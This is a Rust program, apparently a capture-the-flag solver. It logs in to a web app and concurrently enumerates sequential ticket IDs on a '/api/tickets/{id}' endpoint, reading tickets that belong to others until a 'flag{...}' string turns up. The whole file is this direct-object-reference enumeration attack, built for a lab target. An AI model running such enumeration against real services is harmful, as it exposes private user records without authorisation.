use bytes::Bytes;
use clap::Parser;
use regex::Regex;
use reqwest::{Client, Error as ReqwestError, Url, redirect::Policy};
use serde::Deserialize;
use serde_json::from_slice as json_from_slice;
use std::sync::{
    Arc, OnceLock,
    atomic::{AtomicUsize, Ordering},
};
use thiserror::Error;
use tokio::{
    spawn,
    sync::mpsc::{Receiver, Sender, channel},
};

const BUFFER_SIZE: usize = 100;
const BUFFER_CAPACITY_WARNING: usize = 10;
const NUM_THREADS: usize = 10;

#[derive(Parser)]
struct Cli {
    /// The URL to the index page.
    index_url: Url,
    #[arg(short, long)]
    /// Prints information about progress.
    verbose: bool,
}

#[derive(Clone, Debug, PartialEq, Eq, Hash, Deserialize)]
struct Ticket {
    id: usize,
    subject: Box<str>,
    description: Box<str>,
}

#[derive(Clone, Debug, PartialEq, Eq, Hash, Deserialize)]
struct ErrorResponse {
    error: Box<str>,
}

#[tokio::main]
async fn main() -> Result<(), ScanError> {
    let Cli { index_url, verbose } = Cli::parse();
    let client = Client::builder()
        .cookie_store(true)
        .redirect(Policy::limited(1))
        .build()
        .expect("Failed to initialize client.");

    client
        .post(index_url.clone())
        // TODO: change name
        .form(&[("username", "foo")])
        .send()
        .await
        .expect("Failed to get session key.");

    let index_url = Arc::new(index_url);
    let client = Arc::new(client);

    let (tx, rx) = channel(BUFFER_SIZE);
    let counter = Arc::new(AtomicUsize::new(1));

    let mut handles = Vec::with_capacity(NUM_THREADS);
    for _ in 0..NUM_THREADS {
        let client = Arc::clone(&client);
        let index_url = Arc::clone(&index_url);
        let counter = Arc::clone(&counter);
        let tx = tx.clone();
        handles.push(spawn(async move {
            fetch_tickets(tx, client, index_url, counter, verbose).await
        }));
    }

    // TODO: remove?
    drop(tx);

    match process_tickets(rx).await? {
        Scan::Success { flag, id } => {
            println!("Found flag: {flag} (ticket #{id})");
        }
        Scan::Failure => {
            eprintln!("Failed to find flag.");
        }
    }

    for h in handles {
        h.abort();
    }

    Ok(())
}

#[derive(Debug, Error)]
enum ScanError {
    #[error("{0}")]
    Io(#[from] ReqwestError),
    #[error("Unknown JSON schema: {0:?}")]
    UnknownSchema(Bytes),
    #[error("Server responded with an error: {0}")]
    Response(Box<str>),
}

async fn fetch_tickets(
    tx: Sender<Result<Ticket, ScanError>>,
    client: Arc<Client>,
    index_url: Arc<Url>,
    counter: Arc<AtomicUsize>,
    verbose: bool,
) {
    loop {
        let id = counter.fetch_add(1, Ordering::SeqCst);
        if verbose {
            println!("Fetching ticket {id}...");
        }

        let ticket_url = index_url.join(&format!("/api/tickets/{id}")).unwrap();

        async fn fetch(client: &Client, url: Url) -> Result<Bytes, ReqwestError> {
            client.get(url).send().await?.bytes().await
        }

        fn check_capacity(verbose: bool, tx: &Sender<Result<Ticket, ScanError>>) {
            if verbose {
                let capacity = tx.capacity();
                if capacity <= BUFFER_CAPACITY_WARNING {
                    eprintln!("Buffer nearly full ({capacity} left).");
                }
            }
        }

        // If receiver has closed, these errors are not relevant anymore since the flag is found.
        match fetch(&client, ticket_url).await {
            Ok(bytes) => {
                if let Ok(ticket) = json_from_slice(&bytes) {
                    check_capacity(verbose, &tx);
                    if tx.send(Ok(ticket)).await.is_err() {
                        // Receiver has closed: flag is found.
                        break;
                    }
                } else if let Ok(ErrorResponse { error }) = json_from_slice(&bytes) {
                    if &*error == "Ticket not found" {
                        // No more tickets: will be handled in `main`.
                        break;
                    } else {
                        check_capacity(verbose, &tx);
                        _ = tx.send(Err(ScanError::Response(error)));
                    }
                } else {
                    check_capacity(verbose, &tx);
                    _ = tx.send(Err(ScanError::UnknownSchema(bytes)));
                }
            }
            Err(e) => {
                check_capacity(verbose, &tx);
                _ = tx.send(Err(e.into()))
            }
        }
    }
}

enum Scan {
    Success { flag: Box<str>, id: usize },
    Failure,
}

fn regex_flag(haystack: &str) -> Option<&str> {
    static R: OnceLock<Regex> = OnceLock::new();
    // We don't know the exact format of the flag contents, but we assume it at least doesn't contain
    // any '}' characters.
    R.get_or_init(|| Regex::new(r"flag\{(.*?)\}").unwrap())
        .captures(haystack)
        .map(|c| c.get(1).unwrap().as_str())
}

async fn process_tickets(mut rx: Receiver<Result<Ticket, ScanError>>) -> Result<Scan, ScanError> {
    while let Some(ticket) = rx.recv().await {
        let Ticket {
            id,
            subject,
            description,
        } = ticket?;
        if let Some(flag) = regex_flag(&subject).or_else(|| regex_flag(&description)) {
            return Ok(Scan::Success {
                flag: flag.into(),
                id,
            });
        }
    }

    Ok(Scan::Failure)
}
